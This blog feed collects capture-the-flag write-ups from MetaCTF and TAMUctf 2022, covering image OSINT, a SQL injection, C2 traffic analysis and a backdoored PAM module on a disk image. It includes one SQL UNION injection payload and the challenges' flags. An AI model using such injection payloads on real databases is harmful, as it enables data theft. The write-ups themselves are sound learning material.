&lt;p>&lt;img src="https://murphe22.com/posts/images/metactf/sign_of_cities.png" alt="picture">&lt;/p>
&lt;h2 id="solve-5" >Solve
&lt;span>
&lt;a href="#solve-5">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Google image search go brrrr.&lt;/p>
&lt;p>&lt;a href="https://www.google.com/search?tbs=simg:CAESYgm4egF4qbenjhpXCxCwjKcIGjsKOQgEEhSLHvcB1A2jDM8esSSJJsYRqS2wGhobsSNyV5t0GyxbYWZWX4cdF4DSw67Sa_1SydHZ0IAUwBAwLEI6u_1ggaCgoICAESBAXC5ToM&amp;amp;q=marina+&amp;amp;tbm=isch#imgrc=lI4Z2r9ahay2oM">Search&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.google.com/url?sa=i&amp;amp;url=https%3A%2F%2Fwww.facebook.com%2FEgg-Harbor-Marina-Beach-206274509466545%2F&amp;amp;psig=AOvVaw19faRmXpPwUl5JjE_6oYTM&amp;amp;ust=1638681451821000&amp;amp;source=images&amp;amp;cd=vfe&amp;amp;ved=0CAwQjhxqFwoTCJCsmqGyyfQCFQAAAAAdAAAAABAD">Egg Harbor&lt;/a>&lt;/p>
&lt;p>&lt;code>MetaCTF(egg_harbor)&lt;/code>&lt;/p>
&lt;h1 id="yummy-vegetables" >Yummy Vegetables
&lt;span>
&lt;a href="#yummy-vegetables">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I love me my vegetables, but I can never remember what color they are! I know lots of people have this problem, so I made a site to help.&lt;/p>
&lt;p>Here&amp;rsquo;s some sauce to go with the vegetables: index.js&lt;/p>
&lt;h2 id="solve-6" >Solve
&lt;span>
&lt;a href="#solve-6">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Looking at the JS, we see that a query is sent so you can do a UNION attack on this boi.&lt;/p>
&lt;p>Make sure you have the same number of columns as the first query though.&lt;/p>
&lt;p>To find the number of columns, look at the response after submitting a query (we can just do a empty search).&lt;/p>
&lt;p>&lt;code>UNION SELECT 1, 2, flag FROM the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5;--1&lt;/code>&lt;/p>
&lt;p>&lt;code>MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}&lt;/code>&lt;/p>
&lt;h1 id="the-best-laid-plain" >The Best Laid Plain
&lt;span>
&lt;a href="#the-best-laid-plain">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Sometimes, routers can break packets up into fragments to meet abnormal networking requirements, and the endpoint will be responsible for putting these back together. Sometimes however, this doesn&amp;rsquo;t go as planned, as Microsoft found out with CVE-2021-24074. We&amp;rsquo;d like to see the function responsible for this vulnerability, but we&amp;rsquo;re having some trouble finding its name&amp;hellip; Could you see if you could find it?&lt;/p>
&lt;h2 id="solve-7" >Solve
&lt;span>
&lt;a href="#solve-7">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>&lt;a href="https://duckduckgo.com/?q=%22CVE-2021-24074%22+writeup&amp;amp;t=ffab&amp;amp;ia=web">https://duckduckgo.com/?q=%22CVE-2021-24074%22+writeup&amp;amp;t=ffab&amp;amp;ia=web&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.armis.com/blog/from-urgent11-to-frag44-microsoft-patches-critical-vulnerabilities-in-windows-tcpip-stack/">https://www.armis.com/blog/from-urgent11-to-frag44-microsoft-patches-critical-vulnerabilities-in-windows-tcpip-stack/&lt;/a>&lt;/p>
&lt;p>&lt;code>MetaCTF{Ipv4pReceiveRoutingHeader}&lt;/code>&lt;/p>
&lt;h1 id="pattern-of-life" >Pattern of Life
&lt;span>
&lt;a href="#pattern-of-life">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Hackers have breached our network. We know they are there, hiding in the shadows as users continue to browse the web like normal. As a threat hunter, your job is to constantly be searching our environment for any signs of malicious behavior.&lt;/p>
&lt;p>Today you just received a packet capture (pcap) from a user&amp;rsquo;s workstation. We think that an attacker may have compromised the user&amp;rsquo;s machine and that the computer is beaconing out to their command and control (C2) server. Based on some other logs, we also think the attacker was &lt;em>not&lt;/em> using a fully encrypted protocol and also did not put much care into making their C2 server look like a normal website. Your task? We&amp;rsquo;d like you to submit the port number that the C2 server is listening on in the form of MetaCTF{portnumber} as the flag.&lt;/p>
&lt;h2 id="solve-8" >Solve
&lt;span>
&lt;a href="#solve-8">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>So from the prompt, we know we should look at HTTP(S) things. HTTP Command and Control beaconing is a thing.&lt;/p>
&lt;ol>
&lt;li>Look at the HTTP Objects: File -&amp;gt; Export Objects -&amp;gt; HTTP Objects&lt;/li>
&lt;li>Notice the port is 8080&lt;/li>
&lt;/ol>
&lt;p>&lt;code>MetaCTF{8080}&lt;/code>&lt;/p>
&lt;h1 id="the-searcher" >The Searcher
&lt;span>
&lt;a href="#the-searcher">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Alright analyst. We need your help with some investigative work as we dive deeper into one of the infections on our company&amp;rsquo;s network. We&amp;rsquo;ve taken a small packet capture that we know contains some C2 traffic. In order to give us some more leads for the investigation though, we&amp;rsquo;d like to see if we can identify what C2 framework the attacker was using. This will give us some leads into potential host-based artifacts that might be left behind.&lt;/p>
&lt;p>Please submit the name of the C2 Framework being used in the form of MetaCTF{c2frameworkname}&lt;/p>
&lt;h2 id="solve-9" >Solve
&lt;span>
&lt;a href="#solve-9">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Looking at the pcap -&amp;gt; notice the user agent (this is a good way to identify C2 frameworks).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">GET &lt;span style="color:#ff79c6">/&lt;/span>en&lt;span style="color:#ff79c6">-&lt;/span>us&lt;span style="color:#ff79c6">/&lt;/span>docs&lt;span style="color:#ff79c6">.&lt;/span>html HTTP&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">1.1&lt;/span>
User&lt;span style="color:#ff79c6">-&lt;/span>Agent: Mozilla&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">5.0&lt;/span> (Windows NT &lt;span style="color:#bd93f9">6.1&lt;/span>) AppleWebKit&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">537.36&lt;/span> (KHTML, like Gecko) Chrome&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">41.0.2228.0&lt;/span> Safari&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">537.36&lt;/span>
Host: &lt;span style="color:#bd93f9">52.44.115.131&lt;/span>:&lt;span style="color:#bd93f9">8080&lt;/span>
Cookie: ASPSESSIONID&lt;span style="color:#ff79c6">=&lt;/span>fc1060eace; SESSIONID&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#bd93f9">1552332971750&lt;/span>
HTTP&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">1.1&lt;/span> &lt;span style="color:#bd93f9">200&lt;/span> OK
Date: Mon, &lt;span style="color:#bd93f9">22&lt;/span> Nov &lt;span style="color:#bd93f9">2021&lt;/span> &lt;span style="color:#bd93f9">01&lt;/span>:&lt;span style="color:#bd93f9">33&lt;/span>:&lt;span style="color:#bd93f9">24&lt;/span> GMT
Content&lt;span style="color:#ff79c6">-&lt;/span>Type: text&lt;span style="color:#ff79c6">/&lt;/span>plain; charset&lt;span style="color:#ff79c6">=&lt;/span>utf&lt;span style="color:#ff79c6">-&lt;/span>&lt;span style="color:#bd93f9">8&lt;/span>
Server: Microsoft&lt;span style="color:#ff79c6">-&lt;/span>IIS&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">7.5&lt;/span>
Transfer&lt;span style="color:#ff79c6">-&lt;/span>Encoding: chunked
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Google search on the SESSIONID: find &lt;a href="https://github.com/sclow/covenant_mgmt/blob/main/config.yml.example">GitHub&lt;/a>&lt;/p>
&lt;p>&lt;code>MetaCTF{Covenant}&lt;/code>&lt;/p></description></item><item><title>TAMUctf 2022</title><link>https://murphe22.com/posts/tamuctf22/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/tamuctf22/</guid><description>&lt;p>&lt;strong>Ending Rank:&lt;/strong> 1st place amongst TAMU teams and 14th overall (Total of 477 teams)&lt;/p>
&lt;p>TAMUctf is a jeopardy-style cybersecurity capture the flag competition developed and hosted by Texas A&amp;amp;M Students. The competition has been designed to have challenges accessible to newer players as well ones that will keep more experienced players busy. So if you are just getting into cybersecurity or have been playing CTFs for a while, TAMUctf will be a great opportunity to learn new cybersecurity skills!&lt;/p>
&lt;p>&lt;strong>Time:&lt;/strong> Starting at 12:00pm Friday – Closing 12:00pm Sunday&lt;/p>
&lt;p>For this CTF, I only wrote writeups for the challenges I found the most interesting/wanted to make a writeup for in case I need the skills for future CTFs.&lt;/p>
&lt;p>&lt;em>&lt;strong>CTF username:&lt;/strong>&lt;/em> nightfury&lt;/p>
&lt;h1 id="non-stick-disk" >Non Stick Disk
&lt;span>
&lt;a href="#non-stick-disk">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;h2 id="prompt" >Prompt
&lt;span>
&lt;a href="#prompt">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>We&amp;rsquo;ve established a persistence mechanism on the attached disk. Can you determine what that is?&lt;/p>
&lt;p>The flag is in the standard format. You&amp;rsquo;ll know it when you see it. :)&lt;/p>
&lt;p>&lt;strong>Given&lt;/strong>: non-stick-disk.zlib&lt;/p>
&lt;h2 id="solve" >Solve
&lt;span>
&lt;a href="#solve">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>First I had to figure out how to decompress a zlib file within a directory. I used &lt;a href="https://unix.stackexchange.com/questions/22834/how-to-uncompress-zlib-data-in-unix">this&lt;/a> resource in order to do it and piped it into a directory. Full command:&lt;/p>
&lt;p>&lt;code>zlib-flat -uncompress &amp;lt; non-stick-disk.zlib &amp;gt; nonstick&lt;/code>&lt;/p>
&lt;p>From there, I noticed there are a TON of files in the directory, so one trick of forensics (that I now know) is to check the &lt;code>etc/os-release&lt;/code> and then do a diff on the filesystems. From cat-ing the os-release, we see this:&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/non-stick-disk/os-release.png" />
&lt;p>Now came the part that took me the longest&amp;hellip; finding a root filesystem that I could diff on. At first, Rohan and I were pouring through FTK Imager and Autopsy to find sus things, but came to no promising findings (even had a little red herring). After a copious amount of researching, one key google search and many clicks later got me to &lt;a href="https://help.ubuntu.com/community/DebootstrapChroot">Debootstrap&lt;/a>. A little bit more reading on how to Debootstrap and understanding what architecture the nonstick filesystem is (there is a &lt;code>x86_64-linux_gnu&lt;/code> directory in &lt;code>lib&lt;/code>, which indicated amd64), we could create our own Ubuntu 20.04 Focal Fossa &lt;a href="https://pub.nethence.com/xen/debootstrap">quick&lt;/a>! Actual command:&lt;/p>
&lt;p>&lt;code>sudo debootstrap --arch amd64 focal ubuntu (direcotry I want it to go to) http://archive.ubuntu.com/ubuntu&lt;/code>&lt;/p>
&lt;p>With my two filesystems, I could finally do a diff and see what things may be interesting to investigate&amp;hellip; much better than having to search through each file (which I had already done plenty of by this point).&lt;/p>
&lt;p>NOTE: the nonstick directory is actually mounted on a directory called mountpoint&lt;/p>
&lt;p>To diff the filesystems: &lt;code>diff -qr mountpoint ubuntu &amp;gt; diffs.txt&lt;/code>&lt;/p>
&lt;p>&lt;code>-q&lt;/code> for quick so we can see ONLY the files that differ between the two filesystems +
&lt;code>-r&lt;/code> for recursive&lt;/p>
&lt;p>Investigating the &lt;code>diffs.txt&lt;/code>, there is one sus line and that is &lt;code>File mountpount/lib/x86_64-linux-gnu/security/pam_unix.so and ubuntu/lib/x86_64-linux-gnu/security/pam_unix.so differ&lt;/code>. So, I strings-d the file and saw &lt;code>/home/addisoncrump/git/tamuctf-2022/forensics/non-stick-disk/pam_backdoor/linux-pam-1.3.1/modules/pam_unix&lt;/code> so that was pretty assuring that this was indeed the persistence mechanism.&lt;/p>
&lt;p>But where is the flag? Well we have a binary so naturally, the next step is to boot it up in good ol Ghidra. I poked around for a good amount before I finally saw something that could be related to the flag and it was this little snippet:&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/non-stick-disk/alternative_key.png" width=200 height=400/>
&lt;p>Now there is an alternative and alternative_key stored in byte arrays, so that is interesting, but how are they used? Well if we look at the following code:&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/non-stick-disk/xorbytes.png" width=300 height=300 />
&lt;p>This indicates that each byte is xor-d with each other&amp;hellip; so we can go in and grab that hex and xor them against each other.&lt;/p>
&lt;p>The other thing to note here is the &lt;code>bVar9 = 0xea&lt;/code> and &lt;code>bVar9 = 0x8d&lt;/code>. When you xor these values, you get &amp;lsquo;g&amp;rsquo;, so we further know that this is an xor to get the flag. Using &lt;a href="https://xor.pw/">XOR calculator&lt;/a>, we get &lt;code>67656769675f617b6d5f7469625f6f6f746976626f5f73756f795f6669615f756f6d5f6b730000&lt;/code>, which we put into &lt;a href="https://cyberchef.org">Cyberchef&lt;/a>. We did have to mess around a little to get the actual flag format (removing the beginning &amp;ldquo;67&amp;rdquo; and then adding a &amp;ldquo;65&amp;rdquo; at the end). Finaly recipe:&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/non-stick-disk/cyberchef.png" />
&lt;p>Flag: &lt;code>gigem{a_bit_too_obvious_if_you_ask_me}&lt;/code>&lt;/p>
&lt;p>This challenge was incredibly infuriating, but really cool after solving it. Also being one of two solvers was really cool :D.&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/non-stick-disk/solvers2.png" width=300 height=300/>
&lt;p>=== Alternatve (and much faster solve)
After solving the challenge in the way described above, I wondered if you could solve it quicker using grep.&lt;/p>
&lt;p>Turns out Addison didn&amp;rsquo;t strip symbols, so you could in fact &lt;code>grep -r &amp;quot;backdoor&amp;quot;&lt;/code> and find the file&amp;hellip;. :pensive:, but at least I learned a lot in the process!&lt;/p>
&lt;h1 id="vanity" >Vanity
&lt;span>
&lt;a href="#vanity">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;h2 id="prompt-1" >Prompt
&lt;span>
&lt;a href="#prompt-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>&lt;a href="https://github.com/tamuctf/vanity">Read, weep, seethe, and cope.&lt;/a>&lt;/p>
&lt;p>Only commits you need to consider are those made by VTCAKAVSMoACE.&lt;/p>
&lt;p>&lt;strong>Given:&lt;/strong> &lt;a href="https://c.tenor.com/3BMRCVepIa8AAAAC/vanity-smurf-youre-so-vain.gif">vanity-smurf-youre-so-vain.gif&lt;/a>&lt;/p>
&lt;p>== Solve
So at first glance, the link goes to a git repo that is completely empty. There was only one commit and zero history so that was interesting&amp;hellip;.&lt;/p>
&lt;p>The prompt and gif associated with this challenge gave a good amount away. Now I was not very smart and got caught in an article saying you &lt;em>couldn&amp;rsquo;t&lt;/em> mirror a git repo and it wasn&amp;rsquo;t until Rohan looked into it that I realized my grave mistake&amp;hellip;.&lt;/p>
&lt;p>Anywho, looking at this &lt;a href="https://sourcelevel.io/blog/how-to-properly-mirror-a-git-repository">how to properly mirror a git repository&lt;/a>, we could find the mirrored git repo.&lt;/p>
&lt;p>Command: &lt;code>git clone --mirror vanityhttps://github.com/tamuctf/&lt;/code>&lt;/p>
&lt;p>Then we see the following and get the flag!&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/vanity.png"/>
&lt;img src="https://murphe22.com/posts/images/tamuctf/vanity_flag.png"/>
&lt;p>Flag: &lt;code>gigem{watch_the_night_and_bleed_for_me}&lt;/code>&lt;/p>
&lt;h1 id="existing-tooling" >Existing Tooling
&lt;span>
&lt;a href="#existing-tooling">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;h2 id="prompt-2" >Prompt
&lt;span>
&lt;a href="#prompt-2">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Have fun reversing this little crackme. :)&lt;/p>
&lt;p>&lt;strong>Given:&lt;/strong> existing-tooling binary&lt;/p>
&lt;h2 id="solve-1" >Solve
&lt;span>
&lt;a href="#solve-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>NOTE: I did not complete this challenge&lt;/p>
&lt;p>First things first with any RE challenge is to check file type and run the bad boy:&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/existing_tooling/existing_type.png"/>
&lt;p>Key thing: the flag is 72 characters long&amp;hellip; we can look in a handy dandy tool&amp;hellip;&lt;/p>
&lt;p>Ghidra time!!!&lt;/p>
&lt;p>When you load the binary into Ghidra and start at the entry, we see this:&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/existing_tooling/entry.png"/>
&lt;p>Going into that &lt;code>FUN_00101140&lt;/code>, we find an interesting block of code&amp;hellip; it is a pointer that points to null? Strange.&lt;/p>
&lt;img src="https://murphe22.com/posts/images/tamuctf/existing_tooling/point_null.png"/>
&lt;p>So there is probably something there, so let&amp;rsquo;s investigate! GDB gef is a life savior :D.&lt;/p>
&lt;p>Commands:&lt;/p>
&lt;ul>
&lt;li>gdb existing-tooling -&amp;gt; go into gdb (already have gef installed)&lt;/li>
&lt;li>start -&amp;gt; start the program&lt;/li>
&lt;li>vmmap -&amp;gt; this is to get the base address so that I can then set a breakpoint at this sus code block -&amp;gt; starts at 0x00000008000000&lt;/li>
&lt;li>b *0x00000008000000+120d -&amp;gt; set a breakpoint at the derefenced address of base + the offset we see in the image above (don&amp;rsquo;t include &amp;ldquo;h&amp;rdquo; bc that just indicates hex)&lt;/li>
&lt;li>c -&amp;gt; for continue&lt;/li>
&lt;li>x/s $rbp -&amp;gt; we can see part of the flag in the below image, so to get the whole thing, we gotta output the contents of that register (rbp)&lt;/li>
&lt;/ul>
&lt;img src="https://murphe22.com/posts/images/tamuctf/existing_tooling/rbp_flag.png"/>
&lt;p>Flag: &lt;code>gigem{im_curious_did_you_statically_or_dynamically_reverse_ping_addison}&lt;/code>&lt;/p></description></item></channel></rss>